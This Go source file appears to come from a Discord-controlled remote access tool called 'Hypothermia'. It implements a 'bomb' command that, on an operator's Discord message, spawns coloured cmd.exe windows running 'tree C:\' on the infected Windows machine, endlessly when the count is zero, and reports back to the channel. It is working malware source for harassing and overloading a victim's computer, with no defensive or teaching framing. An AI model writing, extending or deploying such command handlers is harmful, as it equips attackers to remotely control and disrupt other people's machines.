package commands

import (
	"fmt"
	"math/rand"
	"os/exec"
	"strconv"
	"syscall"
	"time"

	"Hypothermia/src/misc"
	"github.com/bwmarrin/discordgo"
)

const (
	bombUsage string = "[num windows]"

	bombArgsError string = "🟥 Expected 1 argument."

	bombSendingInf string = "🟩 Sending bombs..."
	bombSending    string = "🟩 Done sending bombs."
)

func (*BombCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) == 0 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.USAGE_F, bombArgsError, bombUsage), m.Reference())
		return
	}

	num, err := strconv.Atoi(args[0])
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, misc.ERROR_CONVERT, m.Reference())
		return
	}

	if num == 0 {
		s.ChannelMessageSendReply(m.ChannelID, bombSendingInf, m.Reference())
	}

	counter := 0
	for {
		color := fmt.Sprintf("%X%X", rand.Intn(16), rand.Intn(16))
		cmd := exec.Command("cmd.exe", "/c", "start", "cmd.exe", "/K", fmt.Sprintf("color %s && tree C:\\", color))
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}

		cmd.Run()
		counter++

		if num != 0 && counter >= num {
			s.ChannelMessageSendReply(m.ChannelID, bombSending, m.Reference())
			break
		}

		time.Sleep(10 * time.Millisecond)
	}
}

func (*BombCommand) Name() string {
	return "bomb"
}

func (*BombCommand) Info() string {
	return "spawns a bunch of cmd windows"
}

type BombCommand struct{}
